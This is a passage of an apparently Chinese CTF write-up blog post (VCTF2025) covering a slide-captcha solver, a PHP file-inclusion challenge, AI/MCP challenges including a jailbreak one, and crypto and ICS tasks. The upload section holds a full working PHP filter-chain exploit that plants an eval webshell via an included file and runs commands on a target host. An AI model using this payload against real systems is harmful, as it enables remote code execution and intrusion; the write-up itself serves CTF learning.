x_pos：</span></span><br><span class="line"><span class="string">    - 对三种背景（src_bg / suffle_bg / suffle_slice_bg）分别做模板匹配</span></span><br><span class="line"><span class="string">    - 每种背景上，用 OpenCV 的 matchTemplate 在整张图上滑动“滑块”图</span></span><br><span class="line"><span class="string">    - 取相似度最高的那一次匹配的 x 作为最终结果</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    这一步完全在本地算，不会打扰靶机。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    piece = b64_to_cv2(captcha_json[<span class="string">&quot;slice&quot;</span>])</span><br><span class="line">    piece_gray = cv2.cvtColor(piece, cv2.COLOR_BGR2GRAY)</span><br><span class="line"></span><br><span class="line">    candidates = []  <span class="comment"># (score, x, bg_name)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> [<span class="string">&quot;src_bg&quot;</span>, <span class="string">&quot;suffle_bg&quot;</span>, <span class="string">&quot;suffle_slice_bg&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> captcha_json:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        bg = b64_to_cv2(captcha_json[key])</span><br><span class="line">        bg_gray = cv2.cvtColor(bg, cv2.COLOR_BGR2GRAY)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 模板匹配，整张图滑一遍滑块</span></span><br><span class="line">        res = cv2.matchTemplate(bg_gray, piece_gray, cv2.TM_CCOEFF_NORMED)</span><br><span class="line">        min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(res)</span><br><span class="line"></span><br><span class="line">        x = max_loc[<span class="number">0</span>]  <span class="comment"># 滑块左上角在该背景上的 x</span></span><br><span class="line">        candidates.append((max_val, <span class="built_in">int</span>(x), key))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[local] bg=<span class="subst">&#123;key&#125;</span>, max_val=<span class="subst">&#123;max_val:<span class="number">.4</span>f&#125;</span>, x=<span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> candidates:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;captcha json 中没有找到任何背景字段&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 取相似度最高的一次匹配</span></span><br><span class="line">    best_val, best_x, best_key = <span class="built_in">max</span>(candidates, key=<span class="keyword">lambda</span> t: t[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[local] choose bg=<span class="subst">&#123;best_key&#125;</span>, score=<span class="subst">&#123;best_val:<span class="number">.4</span>f&#125;</span>, x_pos=<span class="subst">&#123;best_x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> best_x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_validate</span>(<span class="params">session: requests.Session, x_pos: <span class="built_in">int</span></span>) -&gt; <span class="built_in">dict</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    给靶机发一次 /validate，只发这一个 x_pos</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    r = session.post(<span class="string">f&quot;<span class="subst">&#123;BASE&#125;</span>/validate&quot;</span>, json=&#123;<span class="string">&quot;x_pos&quot;</span>: <span class="built_in">int</span>(x_pos)&#125;)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    j = r.json()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[validate x=<span class="subst">&#123;x_pos&#125;</span>] <span class="subst">&#123;j&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> j</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_once</span>(<span class="params">session: requests.Session</span>) -&gt; <span class="built_in">dict</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    解一轮验证码流程：</span></span><br><span class="line"><span class="string">    1. 从靶机获取验证码（/captcha）</span></span><br><span class="line"><span class="string">    2. 在本地通过图片“爆破”算出 x_pos</span></span><br><span class="line"><span class="string">    3. 只向靶机发送这一个 x_pos 进行验证</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    j = get_captcha(session)</span><br><span class="line">    x_pred = local_solve_x_pos(j)</span><br><span class="line">    resp = send_validate(session, x_pred)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    主流程：</span></span><br><span class="line"><span class="string">    - 维护 consecutive 统计连续成功次数</span></span><br><span class="line"><span class="string">    - 一旦失败，重新 new 一个 Session，从 0 开始</span></span><br><span class="line"><span class="string">    - 确保最后的 10 次成功是在同一 Session / Cookie 下连续发生的</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        consecutive = <span class="number">0</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n=== 新的会话开始，准备冲 10 连中 ===&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> consecutive &lt; GOAL:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n--- 当前连续成功次数：<span class="subst">&#123;consecutive&#125;</span>/<span class="subst">&#123;GOAL&#125;</span> ---&quot;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                resp = solve_once(s)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[error] 本轮请求/本地计算出错，直接放弃此轮会话：&quot;</span>, e)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            code = resp.get(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">            srv_count = resp.get(<span class="string">&quot;count&quot;</span>)</span><br><span class="line">            srv_max = resp.get(<span class="string">&quot;max&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> code != <span class="number">2</span>:</span><br><span class="line">                <span class="comment"># 认为是一次成功（一般 code==0 或 1）</span></span><br><span class="line">                consecutive += <span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[*] 本地认为成功，consecutive=<span class="subst">&#123;consecutive&#125;</span>, &quot;</span></span><br><span class="line">                      <span class="string">f&quot;服务端 count=<span class="subst">&#123;srv_count&#125;</span>/<span class="subst">&#123;srv_max&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> resp:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[+] FLAG:&quot;</span>, resp[<span class="string">&quot;flag&quot;</span>])</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 失败：这个 Session 的累计会被清零，扔掉这个 Session 重来</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[!] 验证失败，放弃当前会话，重新开始&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果这里跳出 while consecutive&lt;GOAL，则会回到 while True 重新 new Session</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115115549349.png"
+                      alt="image-20251115115549349"
+                ></p>
+<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>拿了个二血(手速太慢了。。)</p>
+<p>看似是文件上传，实则是文件包含</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115144825202.png"
+                      alt="image-20251115144825202"
+                ></p>
+<p>路径穿越一下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115144853820.png"
+                      alt="image-20251115144853820"
+                ></p>
+<p>如果是包含一个PHP文件，应该用的<code>include()</code>函数</p>
+<p>直接打php-filter链子将<code>/etc/passwd</code>的内容变为shell即可</p>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#参数file</span></span><br><span class="line">url = <span class="string">&quot;http://47.98.117.93:33214/index.php&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/etc/passwd&quot;</span>   <span class="comment">#&quot;/etc/passwd&quot;</span></span><br><span class="line">command = <span class="string">&quot;ls /&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line"><span class="comment"># base64_payload = &quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD9waHAgZXZhbCgkX1BPRVRbMF0pOzs/Pg&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(final_payload)</span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="comment">#&quot;action&quot;: &quot;include&quot;,</span></span><br><span class="line">    <span class="string">&quot;doc&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115145305242.png"
+                      alt="image-20251115145305242"
+                ></p>
+<h1 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h1><h2 id="mcp"><a href="#mcp" class="headerlink" title="mcp"></a>mcp</h2><p>Cherry studio连一下服务器的mcp</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115122424081.png"
+                      alt="image-20251115122424081"
+                ></p>
+<p>直接运行ls命令就出flag了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115122510393.png"
+                      alt="image-20251115122510393"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115122535670.png"
+                      alt="image-20251115122535670"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115122548315.png"
+                      alt="image-20251115122548315"
+                ></p>
+<h2 id="mcp-jailbreak"><a href="#mcp-jailbreak" class="headerlink" title="mcp-jailbreak"></a>mcp-jailbreak</h2><p>严重怀疑这个AI是基于规则的。。。但是我又没证据(bushi</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115151146550.png"
+                      alt="image-20251115151146550"
+                ></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>AI一把嗦</p>
+<h2 id="ez-aes"><a href="#ez-aes" class="headerlink" title="ez_aes"></a>ez_aes</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115124019582.png"
+                      alt="image-20251115124019582"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115124036273.png"
+                      alt="image-20251115124036273"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115124049667.png"
+                      alt="image-20251115124049667"
+                ></p>
+<h2 id="interesting-math"><a href="#interesting-math" class="headerlink" title="interesting_math"></a>interesting_math</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115124104218.png"
+                      alt="image-20251115124104218"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115124119497.png"
+                      alt="image-20251115124119497"
+                ></p>
+<h2 id="ez-Lattice"><a href="#ez-Lattice" class="headerlink" title="ez_Lattice"></a>ez_Lattice</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115175959513.png"
+                      alt="image-20251115175959513"
+                ></p>
+<h1 id="ICS"><a href="#ICS" class="headerlink" title="ICS"></a>ICS</h1><h2 id="iec104"><a href="#iec104" class="headerlink" title="iec104"></a>iec104</h2><p>AI一把嗦</p>
+<p>应该是把流量中分散的base64字符串解码拼接即可</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115124159829.png"
+                      alt="image-20251115124159829"
+                ></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> VCTF2025 WP</li>
+        <li><strong>Author:</strong> xiaolaisec</li>
+        <li><strong>Created at
+                :</strong> 2025-11-18 19:07:05</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-11-18 09:18:52
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/11/18/VCTF2025-WP/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/JAVA/">#JAVA</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/PHP/">#PHP</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Python/">#Python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2025/11/20/%E5%8D%8E%E4%B8%BA%E6%9D%AF2025-WP/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">华为杯2025 WP</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/11/04/AWDP-%E4%B8%93%E9%A2%98/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">AWDP 专题</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">VCTF2025 WP</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#shopping"><span class="nav-text">shopping</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4EXP"><span class="nav-text">完整EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Slide-Captcha"><span class="nav-text">Slide Captcha</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#upload"><span class="nav-text">upload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-1"><span class="nav-text">EXP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#AI"><span class="nav-text">AI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mcp"><span class="nav-text">mcp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mcp-jailbreak"><span class="nav-text">mcp-jailbreak</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-aes"><span class="nav-text">ez_aes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#interesting-math"><span class="nav-text">interesting_math</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-Lattice"><span class="nav-text">ez_Lattice</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ICS"><span class="nav-text">ICS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#iec104"><span class="nav-text">iec104</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">xiaolaisec</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
